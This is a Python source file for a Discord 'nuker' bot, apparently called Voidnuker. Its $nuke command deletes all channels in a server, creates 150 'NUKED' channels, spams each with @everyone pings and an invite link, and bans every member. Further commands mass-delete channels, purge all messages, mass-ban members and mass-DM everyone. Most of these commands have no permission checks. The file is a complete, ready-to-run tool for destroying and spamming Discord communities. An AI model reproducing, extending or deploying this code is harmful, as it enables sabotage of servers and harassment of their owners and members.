import discord
import random
import asyncio
import json

# Load configuration from config.json
with open("config.json") as f:
    config = json.load(f)

# Configuration for rate-limit-friendly batching
delete_batch_size = config.get("delete_batch_size", 20)
create_batch_size = config.get("create_batch_size", 20)
delay_between_batches = config.get("delay_between_batches", 1)
ping_batch_size = config.get("ping_batch_size", 50)
spam_count = config.get("spam_count", 5)
invite_link = config.get("invite_link", "https://discord.gg/dywfjBVvsE")
version = config.get("version", "1.0.2")

# Bot token from config (gitignored)
token = config.get("token")
if not token:
    raise RuntimeError("Bot token not found in config.json")

# Initialize client with intents
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'Logged in as {client.user} (ID: {client.user.id})')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    content = message.content.strip()
    lower = content.lower()
    guild = message.guild

    # ─── NUKE COMMAND ──────────────────────────────────────────────────────────
    if lower.startswith('$nuke'):
        # Delete channels
        channels = list(guild.channels)
        deleted = 0
        for i in range(0, len(channels), delete_batch_size):
            batch = channels[i:i+delete_batch_size]
            tasks = [ch.delete(reason="Voidnuker nuke") for ch in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            deleted += sum(1 for r in results if not isinstance(r, Exception))
            await asyncio.sleep(delay_between_batches)
        # Create channels
        picks = random.sample(range(1,1001), 150)
        created = []
        for i in range(0, len(picks), create_batch_size):
            batch = picks[i:i+create_batch_size]
            tasks = [guild.create_text_channel(f"NUKED-{num:04d}", reason="Voidnuker nuke") for num in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            created.extend([c for c in results if isinstance(c, discord.TextChannel)])
            await asyncio.sleep(delay_between_batches)
        # Spam
        msgs = []
        for ch in created:
            for _ in range(spam_count):
                msgs.append((ch, f"@everyone\n{invite_link}"))
        for i in range(0, len(msgs), ping_batch_size):
            batch = msgs[i:i+ping_batch_size]
            tasks = [ch.send(m) for ch,m in batch]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(delay_between_batches)
        # Summary
        if created:
            await created[0].send(
                f"🗑️ Deleted {deleted} channels.\n"
                f"📂 Created {len(created)} channels.\n"
                f"💥 Spammed each channel {spam_count} times."
            )
        # Ban members
        members = [m for m in guild.members if m != client.user]
        banned = 0
        for i in range(0, len(members), delete_batch_size):
            batch = members[i:i+delete_batch_size]
            tasks = [guild.ban(m, reason="Voidnuker nuke") for m in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            banned += sum(1 for r in results if not isinstance(r, Exception))
            await asyncio.sleep(delay_between_batches)
        if created:
            await created[0].send(f"🔨 Banned {banned} members.")

    # ─── MASSDEL COMMAND ────────────────────────────────────────────────────────
    elif lower.startswith('$massdel'):
        channels = list(guild.channels)
        deleted = 0
        for i in range(0, len(channels), delete_batch_size):
            batch = channels[i:i+delete_batch_size]
            tasks = [ch.delete(reason="Voidnuker massdel") for ch in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            deleted += sum(1 for r in results if not isinstance(r, Exception))
            await asyncio.sleep(delay_between_batches)
        await message.channel.send(f"🗑️ Mass delete complete: {deleted} channels deleted.")

    # ─── DELETEMSGS COMMAND ─────────────────────────────────────────────────────
    elif lower.startswith('$deletemsgs'):
        if not message.author.guild_permissions.manage_messages:
            return await message.channel.send("❌ Missing Manage Messages permission.")
        total = 0
        for ch in guild.text_channels:
            try:
                purged = await ch.purge(limit=None)
                total += purged
                await asyncio.sleep(1)
            except:
                continue
        if total:
            await message.channel.send(f"🗑️ Deleted {total} messages.")

    # ─── MASSBAN COMMAND ─────────────────────────────────────────────────────────
    elif lower.startswith('$massban'):
        members = [m for m in guild.members if m != client.user]
        banned = 0
        for i in range(0, len(members), delete_batch_size):
            batch = members[i:i+delete_batch_size]
            tasks = [guild.ban(m, reason="Voidnuker massban") for m in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            banned += sum(1 for r in results if not isinstance(r, Exception))
            await asyncio.sleep(delay_between_batches)
        await message.channel.send(f"🔨 Mass banned {banned} members.")

    # ─── BAN COMMAND ────────────────────────────────────────────────────────────
    elif lower.startswith('$ban '):
        mentions = message.mentions
        if not mentions:
            return await message.channel.send("❌ Please mention a user to ban.")
        target = mentions[0]
        if target == client.user:
            return await message.channel.send("❌ Cannot ban myself.")
        try:
            await guild.ban(target, reason=f"Banned by {message.author}")
            await message.channel.send(f"🔨 Banned {target.mention}.")
        except Exception as e:
            await message.channel.send(f"❌ Failed to ban {target.mention}: {e}")

    # ─── MASSDM COMMAND ─────────────────────────────────────────────────────────
    elif lower.startswith('$massdm'):
        # existing massdm logic preserved
        guild = message.guild
        msg = content[len('$massdm'):].strip()
        if not msg:
            return await message.channel.send("❌ Provide a message.")
        sent, failed = 0, 0
        for m in guild.members:
            if m.bot or m == message.author:
                continue
            try:
                await m.send(msg)
                sent += 1
            except:
                failed += 1
            await asyncio.sleep(delay_between_batches)
        await message.channel.send(f"📬 Mass DM: {sent} sent, {failed} failed.")

    # ─── DM COMMAND ─────────────────────────────────────────────────────────────
    elif lower.startswith('$dm '):
        mentions = message.mentions
        if not mentions:
            return await message.channel.send("❌ Please mention a user to DM.")
        user = mentions[0]
        # message after mention
        part = content.split('>',1)
        dm_msg = part[1].strip() if len(part)>1 else ''
        if not dm_msg:
            return await message.channel.send("❌ Please provide a message.")
        try:
            await user.send(dm_msg)
            await message.channel.send(f"📬 DM sent to {user.mention}.")
        except Exception as e:
            await message.channel.send(f"❌ Failed to DM {user.mention}: {e}")

    # ─── VERSION COMMAND ────────────────────────────────────────────────────────
    elif lower.startswith('$version'):
        await message.channel.send(f"🤖 Version: {version}")

    # ─── HELP COMMAND ────────────────────────────────────────────────────────────
    elif lower.startswith('$help'):
        help_text = (
            "**Available Commands:**\n"
            "`$nuke` – Full server nuke.\n"
            "`$massdel` – Clean all channels.\n"
            "`$deletemsgs` – Purge all messages.\n"
            "`$massban` – Ban all members.\n"
            "`$ban @user` – Ban specific user.\n"
            "`$massdm <message>` – DM all members.\n"
            "`$dm @user <message>` – DM a user.\n"
            "`$version` – Show version.\n"
            "`$help` – Show this list.\n\n"
            f"Version: {version}"
        )
        await message.channel.send(help_text)

# Run bot
client.run(token)
